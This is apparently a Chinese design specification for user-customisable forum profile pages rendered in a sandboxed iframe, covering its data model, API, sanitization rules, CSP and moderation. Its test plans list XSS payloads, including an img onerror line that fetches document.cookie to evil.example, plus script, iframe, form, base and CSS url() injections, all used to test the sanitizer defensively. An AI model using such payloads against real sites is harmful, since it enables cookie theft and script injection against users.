# 自定义个人主页设计规格

- 日期：2026-10-18
- 状态：待评审
- 范围：Rust 后端（`backend-rs`）+ Vue 前端（`frontend`）
- 关联规格：[用户信息项与板块门槛](2026-10-17-user-info-gates-design.md)

## 1. 背景与目标

论坛中的个人主页目前固定为「资料卡 + 帖子 / 评论 / 关于」三栏结构。本需求允许每个用户选择：

- **普通个人主页**：保持现有结构，也是默认值。
- **自定义个人主页**：用户上传一段 HTML，替换个人主页的资料卡以下内容区。

目标是在开放 HTML 装修能力的同时，保证：

1. 用户上传的 HTML **不能执行 JavaScript**。
2. 自定义主页 **不能向第三方服务器发送信息**。
3. 自定义主页 **不能访问本站后端**（除展示站内图片外），不提供任何数据组件。
4. 用户点击外部链接时 **必须弹出安全风险提示**，展示目标域名，确认后才在新标签页打开。
5. 自定义内容只影响自己的个人主页，不影响站点其他页面与登录态。

## 2. 已确认决策

| 决策点 | 结论 |
| --- | --- |
| 替换范围 | 仅替换个人主页正文内容区，保留顶部导航、左侧栏、个人资料卡 |
| 审核方式 | 免审核，保存即生效；以「举报 + 管理员下架」兜底 |
| 动态能力 | 仅静态 HTML，不提供任何后端数据组件 |
| 资源范围 | 站内图片（`/forum/api/media/{id}`）+ 内联 CSS；外部资源一律拦截 |
| 隔离方案 | 沙箱 iframe + 受信任 shim（方案 A） |
| 样式载体 | 支持 `style` 属性；`<style>` 标签整段移除 |

## 3. 范围

### 3.1 包含

- 主页模式存储与切换（`NORMAL` / `CUSTOM`）。
- 自定义 HTML 的服务端严格净化、大小限制、保存频率限制。
- 自定义主页的公开读取与沙箱渲染。
- 主页装修页 `/settings/homepage`。
- 个人主页 `/u/:id` 按模式渲染。
- 主页举报与管理员下架 / 恢复。
- 管理后台「个人主页」列表。

### 3.2 不包含

- 不执行用户上传的 JavaScript，也不提供脚本白名单。
- 不提供后端数据组件、登录态透传、表单提交。
- 不做发布前人工审核队列。
- 不改变帖子、评论、板块自定义页的现有逻辑。
- 不支持自定义域名、自定义 `<head>`、SEO 收录（iframe 内容不被搜索引擎索引）。
- 不支持视频、音频、外部字体、外部图片、`data:` 资源。

## 4. 数据模型

启动迁移在 `backend-rs/src/migrate.rs` 中幂等创建以下两张表，不修改 `users` 主表。

### 4.1 `user_homepages`

```sql
CREATE TABLE IF NOT EXISTS user_homepages (
  user_id BIGINT NOT NULL PRIMARY KEY,
  mode VARCHAR(10) NOT NULL DEFAULT 'NORMAL',
  html MEDIUMTEXT NULL,
  status VARCHAR(10) NOT NULL DEFAULT 'ACTIVE',
  block_reason VARCHAR(255) NULL,
  blocked_by BIGINT NULL,
  blocked_at DATETIME NULL,
  size_bytes INT NOT NULL DEFAULT 0,
  created_at DATETIME NOT NULL,
  updated_at DATETIME NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
```

字段语义：

| 字段 | 语义 |
| --- | --- |
| `mode` | `NORMAL` / `CUSTOM`，默认 `NORMAL` |
| `html` | 已净化的 HTML；切换回普通主页时保留，便于再次切回 |
| `status` | `ACTIVE` / `BLOCKED` |
| `block_reason` | 下架原因，仅本人与管理员可见 |
| `size_bytes` | 净化后 HTML 的 UTF-8 字节数 |
| `updated_at` | 用于保存冷却判断与列表排序 |

无记录等价于「普通主页 + 无自定义内容」。

### 4.2 `user_homepage_reports`

```sql
CREATE TABLE IF NOT EXISTS user_homepage_reports (
  id BIGINT NOT NULL AUTO_INCREMENT PRIMARY KEY,
  user_id BIGINT NOT NULL,
  reporter_id BIGINT NOT NULL,
  reason VARCHAR(500) NOT NULL,
  created_at DATETIME NOT NULL,
  KEY idx_target_time (user_id, created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
```

## 5. API 设计

所有接口沿用现有 `{code, message, data}` 响应包裹与可选登录提取器 `CurrentUser`。

### 5.1 公开读取主页

`GET /users/:id/homepage`

- 无需登录。
- 用户不存在 → 404。
- 返回分支：

| 条件 | 返回 |
| --- | --- |
| 无记录或 `mode=NORMAL` | `{ "mode": "NORMAL" }` |
| `mode=CUSTOM` 且 `status=ACTIVE` | `{ "mode": "CUSTOM", "html": "...", "blocked": false, "updatedAt": "..." }` |
| `mode=CUSTOM` 且 `status=BLOCKED`，请求者为本人或管理员 | `{ "mode": "CUSTOM", "html": "...", "blocked": true, "blockReason": "...", "updatedAt": "..." }` |
| `mode=CUSTOM` 且 `status=BLOCKED`，其他访问者 | `{ "mode": "NORMAL" }` |

> 被下架内容对其他访问者完全隐藏，不泄露 `blockReason`。

### 5.2 读取自己的主页配置

`GET /users/me/homepage`（需登录）

```json
{
  "mode": "CUSTOM",
  "html": "<div>...</div>",
  "status": "ACTIVE",
  "blockReason": null,
  "sizeBytes": 1234,
  "updatedAt": "2026-10-18T12:00:00"
}
```

无记录时返回：

```json
{
  "mode": "NORMAL",
  "html": null,
  "status": "ACTIVE",
  "blockReason": null,
  "sizeBytes": 0,
  "updatedAt": null
}
```

### 5.3 保存主页配置

`PUT /users/me/homepage`（需登录）

请求体：

```json
{ "mode": "CUSTOM", "html": "<div style=\"padding:24px\">...</div>" }
```

规则：

1. `mode` 必须是 `NORMAL` 或 `CUSTOM`，否则 400。
2. `mode=NORMAL`：只更新模式，保留已存的 `html`。
3. `mode=CUSTOM`：
   - `html` 去空白后不能为空，否则 400「主页内容不能为空」。
   - 原始 HTML 的 UTF-8 字节数不得超过 **65,536**，否则 400「主页内容不能超过 64KB」。
   - 经严格净化后仍为空 → 400「主页内容净化后为空，请移除不支持的标签」。
   - 净化后字节数超过 **131,072**（转义膨胀兜底）→ 400「主页内容净化后过大」。
   - 存储净化后的 HTML，并写入 `size_bytes`。
4. 保存冷却：与上一条记录的 `updated_at` 间隔小于 **3 秒** 时返回 429「保存过于频繁，请稍后再试」。
5. 已处于 `BLOCKED` 的用户可以修改内容，但 `status` 保持 `BLOCKED`，需管理员复核后恢复（防止通过重新保存绕过下架）。
6. 返回与 `GET /users/me/homepage` 相同的完整结构。

### 5.4 重置为普通主页

`POST /users/me/homepage/reset`（需登录）

- 删除当前用户的 `user_homepages` 记录与关联举报记录。
- 返回 5.2 的默认结构。
- 该操作同时清除下架状态。

### 5.5 举报自定义主页

`POST /users/:id/homepage/report`（需登录）

请求体：

```json
{ "reason": "页面包含冒充官方的登录框" }
```

规则：

- 不能举报自己（400）。
- 目标必须存在且为 `mode=CUSTOM`、`status=ACTIVE`，否则 400「该用户没有可举报的自定义主页」。
- `reason` 去空白后长度 5–500，否则 400。
- 同一举报者对同一目标 24 小时内只能举报一次，重复返回 400「你已举报过该主页」。
- 返回 `{ "ok": true }`。

### 5.6 管理端接口

以下接口均要求 `ADMIN`：

- `GET /admin/user-homepages?status=ALL|ACTIVE|BLOCKED&page=1&size=20`
  - 仅返回 `mode=CUSTOM` 的记录。
  - 按 `updated_at DESC` 排序。
  - 使用现有 `PageResponse` 结构，并在每项附带聚合字段：

```json
{
  "userId": 12,
  "username": "alice",
  "mode": "CUSTOM",
  "status": "BLOCKED",
  "sizeBytes": 20480,
  "blockReason": "冒充官方登录页",
  "reportCount": 3,
  "updatedAt": "2026-10-18T12:00:00"
}
```

- `POST /admin/user-homepages/:userId/block`
  - 请求体 `{ "reason": "..." }`，长度 2–200，必填。
  - 无自定义记录 → 404；成功置为 `BLOCKED`，记录 `blocked_by`、`blocked_at`。
- `POST /admin/user-homepages/:userId/unblock`
  - 置为 `ACTIVE`，清空 `block_reason / blocked_by / blocked_at`。

## 6. 安全机制

采用五层纵深防御。任何一层失效都不应直接导致脚本执行或数据外发。

### 6.1 第一层：输入限制

- 原始 HTML ≤ 64KB（UTF-8 字节）。
- 保存冷却 3 秒。
- 图片统一走既有 `POST /media`：必须登录、MIME 仅 `image/jpeg|png|webp|gif`、单图 ≤ 10MB。
- 不存在 SVG 图片路径，避免 SVG 内嵌脚本。

### 6.2 第二层：服务端严格净化

在 `backend-rs/src/sanitizer.rs` 新增 `sanitize_homepage(html: &str) -> String`，使用 `ammonia::Builder` 自定义策略，**不复用**现有宽松的 `sanitize()`。

#### 允许的标签

```
a, abbr, article, aside, b, blockquote, br, caption, code, col, colgroup,
dd, del, details, div, dl, dt, em, figcaption, figure, footer, h1, h2, h3,
h4, h5, h6, header, hr, i, img, ins, li, main, mark, nav, ol, p, pre, q,
s, section, small, span, strong, sub, summary, sup, table, tbody, td, tfoot,
th, thead, tr, u, ul
```

#### 整段移除内容的标签

```
script, style, iframe, object, embed, noscript, template, svg, math,
form, input, button, select, textarea, video, audio, canvas, applet,
frame, frameset, marquee, meta, link, base
```

`style` 被移除后，样式只能通过元素上的 `style` 属性表达。

#### 允许的属性

- 全局：`class`, `id`, `title`, `dir`, `lang`, `style`
- `a`：`href`, `title`
- `img`：`src`, `alt`, `width`, `height`
- `td` / `th`：`colspan`, `rowspan`
- `col` / `colgroup`：`span`
- `ol`：`start`
- `li`：`value`
- `details`：`open`

所有 `on*` 事件属性、`srcset`、`formaction`、`xlink:href`、`background` 一律不允许。

#### URL 规则

- `img src` 仅允许精确匹配：

```
^/forum/api/media/[0-9]+$
```

  其他形式（绝对 URL、协议相对 `//host`、`data:`、相对路径）一律移除 `src`。
- `a href` 允许：
  - `http://` 或 `https://` 开头的绝对地址；
  - `mailto:`；
  - 以单个 `/` 开头的站内路径（必须拒绝 `//` 开头）；
  - `#` 开头的页内锚点。
- `javascript:`、`vbscript:`、`data:` 一律移除。
- 外链统一附加 `rel="noopener noreferrer nofollow"`。

#### CSS 净化

`style` 属性在 `attribute_filter` 中调用 `sanitize_css_declarations`：

1. 去除 `/* ... */` 注释。
2. 按 `;` 拆分为声明；单条声明超过 512 字符或总长度超过 8KB 时丢弃或截断。
3. 属性名只允许小写字母与 `-`，且必须命中白名单。
4. 值中出现以下任一内容（不区分大小写）即整条丢弃：
   - `url(`
   - `image-set(` / `-webkit-image-set(`
   - `cross-fade(` / `element(` / `paint(`
   - `expression(`
   - `javascript:`
   - `vbscript:`
   - `@import`
   - `behavior`
   - `-moz-binding`
   - `var(`
   - `<` 或 `>`
5. 重新拼接为 `prop: value; prop: value`，空结果则移除整个 `style` 属性。

属性白名单：

```
display, position, top, right, bottom, left, z-index, float, clear,
width, min-width, max-width, height, min-height, max-height,
margin, margin-top, margin-right, margin-bottom, margin-left,
padding, padding-top, padding-right, padding-bottom, padding-left,
box-sizing, overflow, overflow-x, overflow-y,
border, border-width, border-style, border-color, border-top,
border-right, border-bottom, border-left, border-radius,
background, background-color, background-image, background-position,
background-size, background-repeat, background-clip,
color, opacity, box-shadow, text-shadow,
font, font-family, font-size, font-weight, font-style, font-variant,
line-height, letter-spacing, word-spacing, text-align, text-decoration,
text-transform, text-indent, text-overflow, white-space, word-break,
overflow-wrap, vertical-align, list-style, list-style-type,
list-style-position, flex, flex-direction, flex-wrap, flex-grow,
flex-shrink, flex-basis, justify-content, align-items, align-content,
align-self, gap, row-gap, column-gap, order,
grid, grid-template-columns, grid-template-rows, grid-auto-flow,
grid-column, grid-row, object-fit, object-position, aspect-ratio,
transform
```

不包含 `animation`、`transition`、`content`、`cursor`，避免动画消耗与视觉误导。

### 6.3 第三层：渲染隔离

新增组件 `frontend/src/components/SafeHomepageFrame.vue`：

```html
<iframe
  class="safe-homepage-frame"
  sandbox="allow-scripts"
  referrerpolicy="no-referrer"
  :srcdoc="documentHtml"
  title="用户自定义主页"
/>
```

关键点：

- **只授予 `allow-scripts`**，不授予 `allow-same-origin`。iframe 处于不透明源（opaque origin），无法读取本站 Cookie、localStorage、父页面 DOM。
- 不授予 `allow-forms`、`allow-popups`、`allow-top-navigation`、`allow-modals`。
- `referrerpolicy="no-referrer"` 避免泄露来源地址。

### 6.4 第四层：CSP + 受信任 shim

父组件在挂载时生成随机 nonce（`crypto.getRandomValues`），把净化后的 HTML 包装为完整文档后写入 `srcdoc`：

```html
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta http-equiv="Content-Security-Policy" content="
    default-src 'none';
    img-src ${origin}/forum/api/media/;
    style-src 'unsafe-inline';
    script-src 'nonce-${nonce}';
    connect-src 'none';
    font-src 'none';
    media-src 'none';
    object-src 'none';
    frame-src 'none';
    worker-src 'none';
    form-action 'none';
    base-uri 'none';
  ">
  <style>
    html, body { margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC", sans-serif;
      color: #1f2328;
      background: transparent;
      overflow-wrap: anywhere;
    }
    img { max-width: 100%; height: auto; }
  </style>
</head>
<body>
  ${sanitizedHtml}
  <script nonce="${nonce}">/* shim */</script>
</body>
</html>
```

- `origin` 取父页面 `window.location.origin`，只放行本站图片；若取不到有效 origin（如 `file://`），渲染层直接拒绝加载并提示环境不安全。
- 用户 HTML 中不存在任何 `script`，因此只有带 nonce 的 shim 能执行。
- `connect-src 'none'` 阻断 `fetch / XHR / WebSocket / sendBeacon`。
- `form-action 'none'` 与已删除的表单标签双重兜底。
- `img-src` 只允许本站源；即使净化被绕过，也无法向第三方发图片请求。
- `default-src 'none'` 阻断字体、媒体、子框架等其余加载。

#### shim 行为（约 60 行，无外部依赖）

1. **链接拦截**：捕获阶段监听 `click` 与 `auxclick`，对最近的 `a[href]`：
   - 站内路径（以 `/` 开头且不以 `//` 开头）：
     将路径（去掉 `/forum` 前缀）通过 `parent.postMessage` 发给父页面，由父页面 `router.push` 处理。
   - 外链（`http:` / `https:`）：
     发送 `{ type: 'external', url, host }`，由父页面弹出风险提示。
   - `mailto:` 放行给浏览器默认行为（不涉及页面跳转与数据读取）。
   - 其他协议一律 `preventDefault`。
2. **阻止默认导航**：拦截 `submit`；`target="_blank"` 由父页面控制。
3. **高度上报**：`ResizeObserver` 监听 `document.documentElement` 与 `document.body`，通过 `postMessage({ type: 'height', height })` 上报；`load` 事件后再上报一次。
4. **消息标记**：所有消息统一带 `__openforum_homepage: 1` 命名空间，父页面据此过滤。
5. **发送目标**：shim 顶部注入 `const PARENT_ORIGIN = ${JSON.stringify(origin)}`，并以其作为 `postMessage` 的 `targetOrigin`，不使用 `'*'`。
6. **注入顺序**：前端拿到服务端净化后的 HTML 后才拼接 shim，用户 HTML 无法影响 shim 的内容与位置。

父页面消息处理：

- 必须同时满足 `event.source === iframe.contentWindow` 与 `event.data.__openforum_homepage === 1`。
- `height`：数值钳制在 `480–4000` 后设置 iframe 高度。
- `internal`：路径必须以 `/` 开头且不以 `//` 开头；父页面拼接 `/forum` 后 `router.push`。
- `external`：用 `ElMessageBox.confirm` 展示：

```
即将离开本站，前往外部网站：{host}
外部网站可能收集你的信息，请注意账号与财产安全。
```

  不使用 HTML 字符串渲染，避免 host 注入；确认后 `window.open(url, '_blank', 'noopener,noreferrer')`。

### 6.5 第五层：治理兜底

- 主页底部为其他访问者展示「举报此主页」入口。
- 举报进入 `user_homepage_reports`，管理后台可按举报数排序查看。
- 管理员可立即下架，内容对他人瞬间隐藏。
- 被下架用户可继续编辑，但必须由管理员恢复后才重新公开。

## 7. 前端设计

### 7.1 路由与入口

- 新增路由：`/settings/homepage`，名称 `homepage-settings`，`meta.requiresAuth = true`。
- 入口：
  - 个人主页资料卡上的「装修主页」按钮（仅本人可见）。
  - 顶部头像下拉菜单新增「主页装修」。
  - 左侧栏「我的主页」下方新增「主页装修」导航项（仅登录用户可见）。
- `/settings/homepage` 与 `/profile`（资料与认证）职责分离：前者装修主页，后者维护资料与认证。

### 7.2 个人主页 `/u/:id`

`Profile.vue` 并行请求 `GET /users/:id` 与 `GET /users/:id/homepage`：

- `mode=NORMAL`：保持现有「帖子 / 评论 / 关于」结构与逻辑。
- `mode=CUSTOM`：
  - 保留资料卡。
  - 资料卡以下替换为 `<SafeHomepageFrame :html="homepage.html" />`。
  - 不显示帖子 / 评论 / 关于标签。
  - 本人：资料卡内显示「装修主页」；若 `blocked=true`，在 iframe 上方显示警告条：

```
你的自定义主页已被管理员下架：{blockReason}。修改后需管理员复核恢复。
```

  - 他人：iframe 底部显示「举报此主页」文字按钮；点击打开举报对话框（原因文本域 + 常用原因快捷选项）。
- `mode=CUSTOM` 但主页接口失败：回退普通主页，不阻断资料页渲染。
- 移动端：iframe 宽度 100%，最小高度 480px。

### 7.3 主页装修页 `/settings/homepage`

页面结构：

1. **模式选择**：两张可选卡片
   - 普通个人主页：展示默认结构示意图。
   - 自定义个人主页：展示安全限制说明。
2. **自定义编辑区**（仅选中自定义时显示）：
   - 工具栏：`插入图片`、`插入示例模板`、`清空`、`恢复普通主页`。
   - HTML 文本域（等宽字体、可滚动）。
   - 实时预览：宽屏左右分栏，窄屏上下堆叠，预览复用 `SafeHomepageFrame`。
   - 字节计数：`12.3 KB / 64 KB`，超限时红色并禁用保存。
   - 安全提示清单：
     - 不支持 JavaScript，`<script>` 会被移除。
     - 仅支持站内图片，外链图片会被移除。
     - 仅支持 `style` 属性，不支持 `<style>` 标签。
     - 外部链接点击时会提示风险。
3. **保存**：调用 `PUT /users/me/homepage`。
4. **下架提示**：`status=BLOCKED` 时顶部显示原因与「提交修改后联系管理员复核」说明。
5. **未保存离开保护**：`onBeforeRouteLeave` 检测脏数据并确认。

图片上传：

- 复用 `mediaApi.upload(file)`。
- 上传成功后在校标位置插入 `<img src="/forum/api/media/{id}" alt="">`。
- 仅接受图片类型，前端校验 ≤10MB。

示例模板使用安全标签与 `style` 属性，作为新用户起点。

### 7.4 管理后台

`Admin.vue` 新增标签页「个人主页」：

- 筛选：全部 / 已发布 / 已下架。
- 列表列：用户、状态、大小、举报数、更新时间。
- 操作：
  - 查看：新标签打开 `/u/:userId`（管理员可看到被下架内容）。
  - 下架：输入原因。
  - 恢复：确认后解除。
- 分页复用现有风格。

## 8. 权限与边界情况

| 场景 | 行为 |
| --- | --- |
| 未登录访问 `/u/:id` | 正常展示普通或已发布的自定义主页 |
| 本人查看被下架主页 | 可见内容 + 下架原因 |
| 管理员查看被下架主页 | 可见内容 + 下架原因 |
| 其他用户查看被下架主页 | 看到普通主页，接口不返回 HTML 与原因 |
| 用户切换回普通主页 | 自定义 HTML 保留，不再展示 |
| 用户重置 | 删除记录与举报，恢复全新状态 |
| 保存超限 / 净化后为空 | 400，前端保留编辑内容并提示 |
| 3 秒内重复保存 | 429，前端提示稍后再试 |
| 图片被删除或不存在 | iframe 内显示破图，不影响页面 |
| 自定义 HTML 含大量元素 | 64KB 上限；高度钳制 4000px |
| 管理员下架后又恢复 | 立即重新公开 |

## 9. 错误处理

- 后端统一使用 `ApiError`：
  - 400：参数、大小、内容为空、重复举报。
  - 401：未登录。
  - 403：非管理员调用管理接口。
  - 404：用户或主页记录不存在。
  - 429：保存过于频繁。
- 前端统一通过 `errorMessage(e, fallback)` 展示后端 `message`。
- 预览渲染失败（如浏览器不支持 sandbox）时展示「当前浏览器不支持安全预览，请升级浏览器」。

## 10. 测试计划

### 10.1 Rust 单元测试（`sanitizer.rs`）

至少覆盖：

1. `<script>alert(1)</script>` → 标签与内容均移除。
2. `<img src=x onerror=alert(1)>` → `onerror` 移除，非法 `src` 移除。
3. `<a href="javascript:alert(1)">x</a>` → `href` 移除。
4. `<a href="https://example.com">x</a>` → 保留并带 `rel="noopener noreferrer nofollow"`。
5. `<a href="//evil.example">x</a>` → `href` 移除。
6. `<img src="/forum/api/media/12">` → 保留。
7. `<img src="https://evil.example/a.png">` → `src` 移除。
8. `<form action="/x"><input></form>` → 表单与控件移除。
9. `<svg onload="alert(1)"></svg>` → 整体移除。
10. `style="background:url(https://evil.example/a.png)"` → 该声明移除。
11. `style="@import url(https://evil.example/a.css)"` → 声明移除。
12. `style="color:red;position:fixed"` → 保留。
13. `<iframe src="https://evil.example"></iframe>` → 整体移除。
14. `<style>body{display:none}</style>` → 整段移除。
15. `<base href="https://evil.example">` → 移除。
16. `data:text/html,<script>` 链接 → `href` 移除。
17. 畸形嵌套标签不 panic，输出仍可渲染。
18. 多字节中文按 UTF-8 字节计算大小。

### 10.2 API 测试

- 64KB 边界：65536 字节通过，65537 字节拒绝。
- 净化后为空 → 400。
- 3 秒内二次保存 → 429。
- 被下架用户保存后仍为 `BLOCKED`。
- 下架内容对匿名/他人返回 `NORMAL`，对本人/管理员返回内容与原因。
- 举报去重与自举报拦截。
- 管理端权限：普通用户 403。

### 10.3 浏览器恶意样例验证

在真实页面保存以下内容并检查：

```html
<script>parent.document.body.innerHTML='pwned'</script>
<img src=x onerror="fetch('https://evil.example/leak?c='+document.cookie)">
<a href="https://evil.example/phish">点我</a>
<iframe src="https://evil.example"></iframe>
<form action="https://evil.example"><input name="x"></form>
<div style="background:url(https://evil.example/a.png);color:red">x</div>
<style>@import url('https://evil.example/a.css');</style>
<base href="https://evil.example/">
```

验收：

- 无脚本执行、无 Cookie 泄露。
- DevTools Network 中不出现对 `evil.example` 的请求。
- 点击外链弹出含目标域名的风险提示。
- 点击站内链接在父页面正常路由。
- iframe 高度随内容变化，滚动条不出现双重嵌套。

## 11. 上线与迁移

1. 后端启动时幂等创建 `user_homepages` 与 `user_homepage_reports`，无需手工 SQL。
2. 现有用户无记录，默认普通主页，行为不变。
3. 先部署后端（新增接口向后兼容），再部署前端。
4. 部署后冒烟：
   - 普通用户保存自定义主页并访问 `/u/:id`。
   - 另一账号访问同一主页并举报。
   - 管理员在后台下架后，他人看到普通主页。
   - 管理员恢复后重新可见。

## 12. 风险与缓解

| 风险 | 缓解 |
| --- | --- |
| 净化策略被绕过导致 XSS | 沙箱无 `allow-same-origin` + CSP nonce 双重兜底；单测覆盖常见向量 |
| 通过图片/字体/CSS 外发数据 | `img-src` 限定本站源；`url()` 与 `@import` 移除；`font-src 'none'` |
| 通过 fetch/XHR 外发 | `connect-src 'none'` |
| 钓鱼外链 | 点击拦截 + 展示目标域名 + 确认后 `noopener noreferrer` 打开 |
| 大量内容拖慢页面 | 64KB 限制、高度钳制、禁止动画/过渡属性 |
| 违规内容 | 举报入口 + 管理员即时下架 |
| 用户绕过下架 | 保存不改变 `BLOCKED` 状态，必须管理员恢复 |
| 浏览器兼容性 | 现代浏览器均支持 sandbox、srcdoc、CSP meta；不支持时提示升级 |

## 13. 验收标准

- [ ] 用户可在「普通个人主页」与「自定义个人主页」之间切换。
- [ ] 自定义 HTML 保存后立即在 `/u/:id` 生效，无需审核。
- [ ] 自定义内容替换资料卡以下内容区，顶部导航、左侧栏、资料卡保留。
- [ ] 上传内容中的 `<script>`、`on*`、`javascript:`、`<iframe>`、`<form>`、`<svg>` 全部被移除。
- [ ] 仅允许 `/forum/api/media/{id}` 形式的站内图片；外链图片与 CSS `url()` 被移除。
- [ ] iframe 使用 `sandbox="allow-scripts"`，不含 `allow-same-origin`。
- [ ] 页面响应包含 CSP，`connect-src 'none'`，仅 nonce shim 可执行。
- [ ] 点击外部链接弹出风险提示并显示目标域名，确认后新标签打开。
- [ ] 站内链接由父页面路由跳转，不在 iframe 内加载。
- [ ] 自定义主页高度自适应，移动端可用。
- [ ] 他人可举报，管理员可下架与恢复；被下架内容对他人不可见。
- [ ] 本人与管理员可查看被下架内容及原因。
- [ ] 64KB 大小限制与 3 秒保存冷却生效。
- [ ] 单元测试、类型检查、构建全部通过。
